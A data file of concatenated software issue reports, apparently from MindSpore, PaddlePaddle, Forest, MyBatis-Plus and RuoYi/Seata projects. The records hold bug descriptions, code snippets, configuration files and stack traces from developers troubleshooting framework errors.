0x7efec37d3104p ThreadPool::ThreadPool(unsigned long)::{lambda()#1}::operator()() const + 404 15 0x7efedc5ea070p 16 0x7efeecdfddf3p 17 0x7efeec4222cdp clone + 109"
全局拦截器请求失败时onError怎么返回json格式数据,"你好，我有个问题想请教下，就是我去调用第三方的接口的时候，如果第三方接口宕机或者其他情况导致请求超时或失败，我想在onError那块修改response，使他能返回一个json提示，我试了下但是都没有生效，不知道是哪出了问题？   <code>: /** * 该方法在请求发送失败时被调用 */ @Override public void onError(ForestRuntimeException ex, ForestRequest request, ForestResponse response) { ContentType contentType = new ContentType(""application/json; charset=utf-8""); response.setContentType(contentType); response.setStatusCode(200); response.setResult(AjaxResult.error(""请求超时，请稍后执行..."")); }"
"[CT][MS][control_flow]net with bool input , grad type error",": /device gpu /device cpu : -- MindSpore version :1.4 -- Python version :3.7.5 -- OS platform and distribution : -- GCC/Compiler version : python (Tensor(shape=[], dtype=Bool, value= False), Tensor(shape=[], dtype=Bool, value= False), Tensor(shape=[], dtype=Float32, value= 1))   <code>: import mindspore.ops.operations as P from mindspore.nn import Cell from mindspore.common import Tensor, dtype from mindspore.ops.composite import GradOperation from mindspore import context #context.set_context(mode=context.PYNATIVE_MODE) class Grad(Cell): def __init__(self, net): super().__init__() self.grad = GradOperation(get_all=True) self.net = net def construct(self, x, y, t): grad_net = self.grad(self.net) grad = grad_net(x, y, t) return grad class CtrlWhileBreakInElse(Cell): def __init__(self): super().__init__() self.mul = P.Mul() def construct(self, x, y, t): while t &gt; 2: t -= 1 if (x and y) or not x: t -= 1 elif x or y: x = not x t -= 2 else: break return t x = Tensor(True, dtype.bool_) y = Tensor(False, dtype.bool_) t = Tensor(3, dtype.float32) net = CtrlWhileBreakInElse() grad_net = Grad(net) grad = grad_net(x, y, t) print(grad) [EXCEPTION] DEVICE(57354,ffff4c1f61e0,python):2021-09-14-14:23:06.058.969 [mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:521] SelectKernelInfo] The operator [AddN] cannot find valid kernel info(input and output data type), not supported the data type: : (&lt;Tensor[Bool], ()&gt;, &lt;Tensor[Bool], ()&gt;, &lt;Tensor[Bool], ()&gt;) -&gt; (&lt;Tensor[Bool], ()&gt;), please refer to the supported data types in candidates kernel info list. trace: In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/add_impl.py(287)/ return F.addn((x, y))/ , Node DebugString: kernel_graph_6:[CNode]136{[0]: ValueNode&lt;Primitive&gt; AddN, [1]: [Parameter]137, [2]: [Parameter]138, [3]: [Parameter]139} Traceback (most recent call last): File ""logic.py"", line 45, in &lt;module&gt; grad = grad_net(x, y, t) File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 391, in __call__ out = self.compile_and_run(*inputs) File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 655, in compile_and_run self.compile(*inputs) File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 642, in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/common/api.py"", line 525, in compile result = self._graph_executor.compile(obj, args_list, phase, use_vm, self.queue_name) TypeError: mindspore/ccsrc/runtime/device/ascend/kernel_select_ascend.cc:521 SelectKernelInfo] The operator [AddN] cannot find valid kernel info(input and output data type), not supported the data type: : (&lt;Tensor[Bool], ()&gt;, &lt;Tensor[Bool], ()&gt;, &lt;Tensor[Bool], ()&gt;) -&gt; (&lt;Tensor[Bool], ()&gt;), please refer to the supported data types in candidates kernel info list. trace: In file /root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/ops/composite/multitype_ops/add_impl.py(287)/ return F.addn((x, y))/ , Node DebugString: kernel_graph_6:[CNode]136{[0]: ValueNode&lt;Primitive&gt; AddN, [1]: [Parameter]137, [2]: [Parameter]138, [3]: [Parameter]139} #"
【众智】【计算-GPU开发】MatrixSquareRoot,"计算一个或多个方阵的矩阵平方根。 input y 对应底层算子 Classify Name Type Type Range Required Doc Default INPUT input float16,float32,float64,complex64, complex128 TRUE OUTPUT y float16,float32,float64,complex64, complex128 TRUE 标杆接口参考 Tensorflow接口tf.raw_ops.MatrixSquareRoot： https://tensorflow.google.cn/api_docs/python/tf/raw_ops/MatrixSquareRoot 3. 异常处理 4. 算子反向 接入反向算子MatrixSquareRootGrad。参考TensorFlow框架tensorflow/python/ops/linalg_grad.py文件 @ops.RegisterGradient(""MatrixSquareRoot"")   <code>: class MatrixSquareRoot(Primitive):"
尝试保存变量到文件报错,"在fluid.layers.tensor 里面找到save函数，不知道下面用法对不对   <code>: def testsave(): x = fluid.layers.create_parameter(dtype=""float32"", shape=[5, 10], name=""x"") exe = fluid.Executor(fluid.CPUPlace()) exe.run(fluid.default_startup_program()) fluid.layers.tensor.save(x, 'x.data')"
fix recurrent_group parsing bug.,"fixes https://github.com/PaddlePaddle/Paddle/issues/2834 inputs for step function probably does not have a type of , , or . Fix the parsing bug when this is true. refine the lstmemory_unit in paddle.networks.   <code>: LayerOutput StaticInput GeneratedInput"
新增OP开发碰到的问题,根据Paddle官网的进阶教程中新增OP的教程——如何写新增的C++ OP， 按照教程所给的步骤： 在build/paddle/fluid/operators目录下，运行下面命令可以进行编译：make mul_op；但是在本地端无法显示无此rule： 请问是还需要修改对应的哪个cmakelists么？~   <code>: [vslyu@yq01-hpc-bdl161.yq01.baidu.com operators]$ make similarity_focus_op1 /usr/bin/make64 MAC=64 similarity_focus_op1 make64: *** No rule to make target `similarity_focus_op1'. Stop.
masked_select raise ValueError when calling multiple times ,"raise ValueError when calling it multiple times. It is ok under but problematic under . / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : 1.9.0 -- Python version : 3.9.15 -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph Run the above code snippet. It is expected to output a shape=(4, 5) tensor   <code>: ops.masked_select PYNATIVE_MODE GRAPH_MODE import mindspore as ms import mindspore.ops as ops import mindspore.nn as nn import numpy as np from mindspore import Tensor class TestNet(nn.Cell): def construct(self, x, y): mask = y &gt; 1 x = ops.masked_select(x, mask[:, None]).reshape(-1, 5) y = ops.masked_select(y, mask) mask = y &gt; 3 x = ops.masked_select(x, mask[:, None]).reshape(-1, 5) y = ops.masked_select(y, mask) mask = y &gt; 5 x = ops.masked_select(x, mask[:, None]).reshape(-1, 5) return x def main(): ms.set_context(mode=ms.GRAPH_MODE) net = TestNet() x = Tensor(np.arange(50).reshape(10, 5)) y = Tensor(np.arange(10)) result = net(x, y) assert result.shape == (4, 5) if __name__ == '__main__': main() ValueError: For 'MaskedSelect', the two input 'input' and 'mask' with shape: [const vector][10] and [const vector][8] can not broadcast."
【众智】【计算-用户接口】CosineSimilarity,CosineSimilarity NN接口 计算指定维度的余弦值。 NN接口 接口目录：mindspore/python/mindspore/nn/layer/math.py x1 x2 output axis int 属性 eps float 属性 对标接口参考 PyTorch1.8.1接口： torch.nn.CosineSimilarity https://pytorch.org/docs/1.8.1/generated/torch.nn.CosineSimilarity.html 3. 异常处理 4. 算子反向 通过小算子拼接自动求解反向   <code>: class CosineSimilarity(Cell):
 [新功能] 授权功能开发,<del>支持第三方授权</del>（暂不在 v1.0 版本支持）   <code>: Jwt
 【quick start】quick start中用cfg=trainer_config.bidi-lstm.py训练的lstm模型，无法用cfg=trainer_config.lstm.py来进行预测,"quick start中用cfg=trainer_config.bidi-lstm.py训练的lstm模型，无法用cfg=trainer_config.lstm.py来进行预测。 root@0a88acc80043:~/paddle/demo/quick_start# ./predict.sh Paddle release a new version v0.9.0, you can get the install package in http://www.paddlepaddle.org I1124 08:46:21.937424 17543 Util.cpp:155] commandline: /usr/local/bin/../opt/paddle/bin/paddle_trainer --config=trainer_config.lstm.py --use_gpu=false --job=test --init_model_path=output/pass-00003 --config_args=is_predict=1 --predict_output_dir=. I1124 08:46:21.937628 17543 Util.cpp:130] Calling runInitFunctions I1124 08:46:21.937924 17543 Util.cpp:143] Call runInitFunctions done. [WARNING 2016-11-24 08:46:22,086 networks.py:1438] routine try to calculate network's inputs and outputs order. It might not work well.Please see follow log carefully. [INFO 2016-11-24 08:46:22,086 networks.py:1466] The input order is [word] [INFO 2016-11-24 08:46:22,086 networks.py:1472] The output order is [maxid_layer_0, fc_layer_0] I1124 08:46:22.094259 17543 Trainer.cpp:149] trainer: in testing mode I1124 08:46:22.094307 17543 Trainer.cpp:156] trainer mode: Testing I1124 08:46:22.196655 17543 PyDataProvider2.cpp:257] loading dataprovider dataprovider_emb::process_predict I1124 08:46:22.197605 17543 GradientMachine.cpp:123] Loading parameters from output/pass-00003 I1124 08:46:22.205034 17543 Parameter.cpp:344] missing parameters [output/pass-00003/<em>lstm_transform___lstm_0</em>_.w0] while loading model. F1124 08:46:22.205085 17543 Parameter.cpp:350] <em>lstm_transform___lstm_0</em>_.w0 missing, not allowed. *** Check failure stack trace: *** @ 0x7f82d3e18daa (unknown) @ 0x7f82d3e18ce4 (unknown) @ 0x7f82d3e186e6 (unknown) @ 0x7f82d3e1b687 (unknown) @ 0x825ce2 paddle::Parameter::load() @ 0x5633a6 paddle::GradientMachine::loadParameters() @ 0x6b689c paddle::ParameterUtil::loadParametersWithPath() @ 0x6c0a6d paddle::Tester::test() @ 0x52b718 main @ 0x7f82d3024f45 (unknown) @ 0x540c05 (unknown) @ (nil) (unknown) /usr/local/bin/paddle: line 109: 17543 Aborted ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2}   <code>: outputs"
3.5.0版本达梦数据库不支持枚举,"当前使用版本 3.5.0 达梦数据库DM8 驱动DmJdbcDriver18 该问题是如何引起的？ 升级版本到最新版3.5.0，降级后消失 升级到版本3.5.0 查询一个有通用枚举的单表 单表配置: 枚举: 执行方法： testMapper.selectList()   <code>: @Data @TableName(""TEST"") public class TestEntity extends BaseEntity&lt;Long&gt; { private Long id; private LxEnum lx; } public enum LxEnum implements IDBEnum &lt;String&gt; { type1(""1"", ""类型1""), type2(""2"", ""类型2""), ; private String value; private String desc; LxEnum(String value, String desc) { this.value = value; this.desc = desc; } @Override public String getDesc() { return desc; } @Override public String getValue() { return value; } } public interface IDBEnum&lt;T extends Serializable&gt; extends IEnum &lt;T&gt; { @JsonValue @Override T getValue(); String getDesc(); } Error attempting to get column 'LX' from result set. Cause: dm.jdbc.driver.DMException: 不支持该数据类型 ; uncategorized SQLException; SQL state [HY004]; error code [6006]; 不支持该数据类型; nested exception is dm.jdbc.driver.DMException: 不支持该数据类型 org.springframework.jdbc.UncategorizedSQLException: Error attempting to get column 'LX' from result set. Cause: dm.jdbc.driver.DMException: 不支持该数据类型 ; uncategorized SQLException; SQL state [HY004]; error code [6006]; 不支持该数据类型; nested exception is dm.jdbc.driver.DMException: 不支持该数据类型 at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:89) ~[spring-jdbc-5.2.7.RELEASE.jar:5.2.7.RELEASE] at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) ~[spring-jdbc-5.2.7.RELEASE.jar:5.2.7.RELEASE] at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) ~[spring-jdbc-5.2.7.RELEASE.jar:5.2.7.RELEASE] at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:91) ~[mybatis-spring-2.0.6.jar:2.0.6] at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:441) ~[mybatis-spring-2.0.6.jar:2.0.6] at com.sun.proxy.$Proxy107.selectList(Unknown Source) ~[na:na] at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:224) ~[mybatis-spring-2.0.6.jar:2.0.6] at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForMany(MybatisMapperMethod.java:166) ~[mybatis-plus-core-3.5.0.jar:3.5.0] at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:77) ~[mybatis-plus-core-3.5.0.jar:3.5.0] at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) ~[mybatis-plus-core-3.5.0.jar:3.5.0] at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) ~[mybatis-plus-core-3.5.0.jar:3.5.0] at com.sun.proxy.$Proxy350.selectList(Unknown Source) ~[na:na] at com.baomidou.mybatisplus.extension.service.IService.list(IService.java:370) ~[mybatis-plus-extension-3.5.0.jar:3.5.0] at com.baomidou.mybatisplus.extension.service.IService$$FastClassBySpringCGLIB$$f8525d18.invoke(&lt;generated&gt;) ~[mybatis-plus-extension-3.5.0.jar:3.5.0] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.7.RELEASE.jar:5.2.7.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:687) ~[spring-aop-5.2.7.RELEASE.jar:5.2.7.RELEASE] at"
 [漏洞] 不同数据库命令参数前缀都添加了 `@` 处理,数据库采用 方式，其他数据库采用 方式   <code>: Oracle : @
2.6.4在IE8中报js错误,"一共2个错误，在chrome里一切功能正常。ie8版本为64位，,放在最后的body前面，采用全模块加载方式。   <code>: &lt;script src=""../layui/layui.js""&gt;&lt;/script&gt;"
Improve CI speed,"Our CI has been running slow recently. Qing-Qing, Yu Yang, Helin, Chen Xi, Ya-ming, Yi-bing, and I discussed this issue and here are what we learned and what we are going to do: A. Reduce the number of SM architectures We are building many SM architectures in the CI: https://github.com/PaddlePaddle/Paddle/blob/develop/cmake/cuda.cmake. According to the experiment of Qing-qing, https://github.com/PaddlePaddle/Paddle/issues/5491, nvcc could run faster if we generate less number of SM architectures. Helin is going to configure the CI system to generate only one SM architecture when checking PRs, but generating all SM architecture code in the nightly build of the develop branch. B. Migrate the CI system to two servers We are running four TeamCity agents on four GPU desktops, each with one GPU and a desktop-level CPU (a few cores). We have two idle servers, each with 6 GPUs and a powerful CPU with 56 cores. Helin will migrate the CI system to the servers. C. Distribute unit tests to multiple GPUs Our CI system runs unit tests by calling , where is the number of processes that run unit tests in parallel. However, all these processes are using the same GPU. Qing-qing is going to study if we can make cmake/ctest to use more than one GPUs. D. Add an environment variable to distinguish unit tests and regression tests. Unit tests and regression tests are tested on CI server for every PR. They should be distinguished. Only unit tests should be run for every PR. Nightly builds should run all tests. We should add an environment flag to control it.   <code>: ctest -j N N N"
"[CT][MS][ExtractGlimpse] ExtractGlimpse：非tensor时，报错信息中指代错了；当 uniform_noise 是 'False'时,  noise 应可以为  'uniform' ","1, 输入非Tensor时，报错信息中错误。 /mode graph   <code>: def test_extractglimpse_input_offsets_not_tensor(): input_x = Tensor(np.random.randn(1, 4, 2, 3), dtype=mstype.float32) size = Tensor(np.random.randint(2, 10, size=(2)), dtype=mstype.int32) offsets = (3.5, 4.5) net = ExtractGlimpse(size_=input_x, centered=True, normalized=True, uniform_noise=True, noise='uniform') fact = AnyNetFactory(net=net) # with pytest.raises(TypeError): &gt; fact(size, offsets) test_extractglimpse.py:579: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/meta.py:752: in __call__ return self.net(*args) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:601: in __call__ raise err /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:597: in __call__ output = self._run_construct(cast_inputs, kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:416: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/ops/primitive/extractglimpse_ops.py:24: in construct return self.ss(x, self.size, offsets) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:294: in __call__ return _run_op(self, self.name, args) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/common/api.py:93: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[ExtractGlimpse]&lt;centered=True, normalized=True, uniform_noise=True, noise=uniform, cust_aicpu=ExtractGlimpse, max_length=1000000&gt;, op_name = 'ExtractGlimpse' args = (Tensor(shape=[2], dtype=Int32, value= [3, 3]), Tensor(shape=[1, 4, 2, 3], dtype=Float32, value= [[[[ 1.47375911e-01, ...7987075e-01, 6.46062016e-01, 1.04588604e+00], [ 1.39734179e-01, -1.55751765e+00, 5.17565012e-02]]]]), (3.5, 4.5)) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E TypeError: mindspore/core/ops/extract_glimpse.cc:113 ExtractGlimpseInferType] For ExtractGlimpse, the input size only support tensor! def test_extractglimpse_input_uniform_noise_false_noise_uniform(): input_list = [] input_list.append(Tensor(np.random.randn(1, 4, 2, 3), dtype=mstype.float32)) input_list.append(Tensor(np.random.randint(2, 10, size=(2)), dtype=mstype.int32)) input_list.append(Tensor(np.random.randn(1, 2), dtype=mstype.float32)) attributes = {'centered': False, 'normalize': True, 'uniform_noise': False, 'noise': 'uniform'} fact = ExtractGlimpseMock(attributes=attributes, inputs=input_list) # with pytest.raises(ValueError): fact.forward_tensorflow_impl() &gt; fact.forward_mindspore_impl() test_extractglimpse.py:618: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/extractglimpse_ops.py:58: in forward_mindspore_impl out = net(self.input_x, self.input_offsets) ../share/utils.py:185: in __call__ out = super().__call__(*args, **kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:601: in __call__ raise err /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:597: in __call__ output = self._run_construct(cast_inputs, kwargs) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:416: in _run_construct output = self.construct(*cast_inputs, **kwargs) ../share/ops/primitive/extractglimpse_ops.py:24: in construct return self.ss(x, self.size, offsets) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:294: in __call__ return _run_op(self, self.name, args) /root/miniconda3/envs/xuegao3.7/lib/python3.7/site-packages/mindspore/common/api.py:93: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[ExtractGlimpse]&lt;centered=False, normalized=True, uniform_noise=False, noise=uniform, cust_aicpu=ExtractGlimpse, max_length=1000000&gt;, op_name = 'ExtractGlimpse' args = (Tensor(shape=[1, 4, 2, 3], dtype=Float32, value= [[[[-4.80010509e-01, 3.14506471e-01, -2.01741606e-01], [-9.85955...ape=[2], dtype=Int32, value= [2, 2]), Tensor(shape=[1, 2], dtype=Float32, value= [[ 1.85653672e-01, -1.34180164e+00]])) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E RuntimeError: mindspore/ccsrc/plugin/device/cpu/kernel/extract_glimpse_cpu_kernel.cc:80 Necessity] noise type unsupported."
MySQL生成的SQL代码，时间字段是否会考虑加上自动更新，如下代码,类似生成如下代码   <code>: update_time datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '修改时间'
开启seata控制台一直报错,"nacos上对应服务的配置文件 发现只要服务开启seata配置服务启动后控制台就一直输出 seata: enabled: true 如下信息 并且访问的接口都是 请问是什么原因,如何解决 #解决方案 因为文档中未介绍file类型的配置文件介绍 参考集成nacos配置中心 http://doc.ruoyi.vip/ruoyi-cloud/cloud/seata.html#%E9%9B%86%E6%88%90nacos%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83 后可解决 导致错误的原因参考文章 https://blog.csdn.net/NikerunZoo/article/details/108858945t   <code>: # spring配置 spring: redis: host: localhost port: 6379 password: datasource: druid: stat-view-servlet: enabled: true loginUsername: admin loginPassword: 123456 dynamic: druid: initial-size: 5 min-idle: 5 maxActive: 20 maxWait: 60000 timeBetweenEvictionRunsMillis: 60000 minEvictableIdleTimeMillis: 300000 validationQuery: SELECT 1 FROM DUAL testWhileIdle: true testOnBorrow: false testOnReturn: false poolPreparedStatements: true maxPoolPreparedStatementPerConnectionSize: 20 filters: stat,slf4j connectionProperties: druid.stat.mergeSql\=true;druid.stat.slowSqlMillis\=5000 datasource: # 主库数据源 master: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://192.168.29.213:6306/mgi-ry-cloud?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8 username: root password: root # 从库数据源 slave: username: root password: root url: jdbc:mysql://192.168.29.213:6306/ultrasonic_db?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8 driver-class-name: com.mysql.cj.jdbc.Driver # seata: true # 开启seata代理，开启后默认每个数据源都代理，如果某个不需要代理可单独关闭 # seata配置 seata: # 默认关闭，如需启用spring.datasource.dynami.seata需要同时开启 enabled: false # Seata 应用编号，默认为 ${spring.application.name} application-id: ${spring.application.name} # Seata 事务组编号，用于 TC 集群名 tx-service-group: ${spring.application.name}-group # 关闭自动代理 enable-auto-data-source-proxy: false # 服务配置项 service: # 虚拟组和分组的映射 vgroup-mapping: ruoyi-system-group: default config: type: nacos nacos: serverAddr: 127.0.0.1:8848 group: SEATA_GROUP namespace: registry: type: nacos nacos: application: seata-server server-addr: 127.0.0.1:8848 namespace: 09:42:01.446 [timeoutChecker_1_1] ERROR i.s.c.r.n.NettyClientChannelManager - [reconnect,164] - Failed to get available servers: endpoint format should like ip:port java.lang.IllegalArgumentException: endpoint format should like ip:port { ""msg"": ""No available service"", ""code"": 500 }"
Profiling error 'MsprofReporterCallback callback is nullptr',"Hardware Environment(): /device ascend : -- MindSpore version (1.1.0): -- Python version : -- OS platform and distribution (e.g., Linux Ubuntu 18.04): -- GCC/Compiler version : Adding Profiler into training scripts following the tutorial(http://www.mindspore.cn/tutorial/training/zh-CN/r1.1/advanced_use/performance_profiling.html) I did something as following. ) But there is an error occurs. So, how dose this error occurs and how to deal with it ? A training scripts which occurs error. https://paste.ubuntu.com/p/vjSPJQrKTS/ A testing scripts that occurs no error, but can not attain analysis data https://paste.ubuntu.com/p/nQk8jFkz7F/ It generate something as following, but catalogue container/1/data is empty.   <code>: context.set_context(mode = 0, device_target = ""Ascend"", device_id = device_id) profiler = Profiler(output_path = 'summary_dir') network = ... model.train(...) profiler.analyse() [ERROR] DEVICE(25375,python3):2021-01-20-00:13:47.047.658 [mindspore/ccsrc/runtime/device/ascend/profiling/profiling_manager.cc:220] CallMsprofReport] MsprofReporterCallback callback is nullptr. [ERROR] DEVICE(25375,python3):2021-01-20-00:13:47.047.743 [mindspore/ccsrc/runtime/device/ascend/profiling/reporter/desc_reporter.cc:46] ReportByLine] Report data failed"
Add Rotate API for CV data processing,"Task Use this template for task tracking kind/task Task Description Add Rotate C++ and Python APIs for CV data processing. Task Goal Rotate now can be used to rotate the images with specified degrees. Sub Task No. Task Description Issue ID 1 2   <code>: class mindspore.dataset.vision.c_transforms.Rotate(degrees, resample=Inter.NEAREST, expand=False, center=None, fill_value=0) Rotate(float degrees, InterpolationMode resample = InterpolationMode::kNearestNeighbour, bool expand = false, std::vector&lt;float&gt; center = {-1, -1}, std::vector&lt;uint8_t&gt; fill_value = {0, 0, 0});"
指定请求体类型的@BodyType注解,"用于指定请求体类型的注解，可用于发送请求体格式与ContentType相异的数据 注解同时可以指定Encoder 如果要指定特定JSON转换器为某一请求的Encoder，可以使用对应JSON框架的快捷注解   <code>: @BodyType /** * 此请求Content-Type头为 x-www-form-urlencoded * 而请求体的格式却可以是JSON格式 */ @BodyType(""json"") @Post(url = ""/"", contentType = ContentType.APPLICATION_X_WWW_FORM_URLENCODED) String send(@Body(""name"") String name, @Body(""value"") Object value); @BodyType /** * 指定请求体格式为json的同时，指定Encoder为Jackson转换器 */ @BodyType(type = ""json"", encoder = ForestJacksonConverter.class) @Post(url = ""/"", contentType = ContentType.APPLICATION_X_WWW_FORM_URLENCODED) String send(@Body Entry entry); /** * 指定Fastjson为Encoder */ @FastjsonEncoder @Post(""/"") String sendFastjson(@Body Entry entry); /** * 指定Jackson为Encoder */ @JacksonEncoder @Post(""/"") String sendJackson(@Body Entry entry); /** * 指定Gson为Encoder */ @GsonEncoder @Post(""/"") String sendGson(@Body Entry entry);"
[CT][MS][switch_layer] Passing a tensor tuple to switch_layer could not work,": GPU /device gpu : -- MindSpore version : vm+Graph -- Python version : -- OS platform and distribution : -- GCC/Compiler version :   <code>: class TwoInputTupleFinalNet(Cell, MetaFactory): def __init__(self, funcs): super().__init__() MetaFactory.__init__(self) self.funcs = funcs def construct(self, i, inputa, inputb): inputs = (inputa, inputb) x = self.funcs[i](inputs) return x def test_parser_switch_layer_inputs_tuple(): class Add(Cell): def __init__(self): super().__init__() self.op = P.TensorAdd() def construct(self, x): y = self.op(x[0], x[1]) return self.op(x[0], y) class Mul(Cell): def __init__(self): super().__init__() self.op = P.Mul() def construct(self, x): y = self.op(x[0], x[1]) return self.op(x[0], y) class MulTwoInput(Cell): def __init__(self): super().__init__() self.op = P.Mul() def construct(self, x, y): y = self.op(x, y) return self.op(x, y) func1 = Add() func2 = Mul() funcs = (func1, func2) net = TwoInputTupleFinalNet(funcs) input = Tensor(np.random.randn(2, 3, 4, 5).astype(np.float32)) input2 = Tensor(np.random.randn(2, 3, 4, 5).astype(np.float32)) i = Tensor(1, mstype.int32) netout = net(i, input, input2) net_good = MulTwoInput() goodout = net_good(input, input2) allclose_nparray(goodout.asnumpy(), netout.asnumpy(), 0, 0) #test backward grad = Tensor(np.random.randn(2, 3, 4, 5).astype(np.float32)) back_net = GradOfAllInputs(net) back_net_good = GradOfAllInputs(net_good) back_out = back_net(i, input, input2, grad) back_out_good = back_net_good(input, input2, grad) allclose_nparray(back_out[1].asnumpy(), back_out_good[0].asnumpy(), 0, 0) allclose_nparray(back_out[2].asnumpy(), back_out_good[1].asnumpy(), 0, 0)"
gateway网关启动报错,"pigx版本: 3.3.0 是否二开: 是 是否修改包名: 是 网关模块启动时报错，环境似乎没问题 redis 是通的   <code>: 2019-09-20 14:48:53.239 DEBUG 12072 --- [ main] o.s.boot.diagnostics.FailureAnalyzers : FailureAnalyzer org.springframework.boot.autoconfigure.jdbc.HikariDriverConfigurationFailureAnalyzer@348bd063 failed java.lang.TypeNotPresentException: Type org.springframework.jdbc.CannotGetJdbcConnectionException not present at sun.reflect.generics.factory.CoreReflectionFactory.makeNamedType(CoreReflectionFactory.java:117) ~[na:1.8.0_102] at sun.reflect.generics.visitor.Reifier.visitClassTypeSignature(Reifier.java:125) ~[na:1.8.0_102] at sun.reflect.generics.tree.ClassTypeSignature.accept(ClassTypeSignature.java:49) ~[na:1.8.0_102] at sun.reflect.generics.visitor.Reifier.reifyTypeArguments(Reifier.java:68) ~[na:1.8.0_102] at sun.reflect.generics.visitor.Reifier.visitClassTypeSignature(Reifier.java:138) ~[na:1.8.0_102] at sun.reflect.generics.tree.ClassTypeSignature.accept(ClassTypeSignature.java:49) ~[na:1.8.0_102] at sun.reflect.generics.repository.ClassRepository.getSuperclass(ClassRepository.java:90) ~[na:1.8.0_102] at java.lang.Class.getGenericSuperclass(Class.java:777) ~[na:1.8.0_102] at org.springframework.core.ResolvableType.getSuperType(ResolvableType.java:466) ~[spring-core-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.core.ResolvableType.as(ResolvableType.java:455) ~[spring-core-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.core.ResolvableType.forClass(ResolvableType.java:1037) ~[spring-core-5.1.9.RELEASE.jar:5.1.9.RELEASE] at org.springframework.boot.diagnostics.AbstractFailureAnalyzer.getCauseType(AbstractFailureAnalyzer.java:56) ~[spring-boot-2.1.7.RELEASE.jar:2.1.7.RELEASE] at 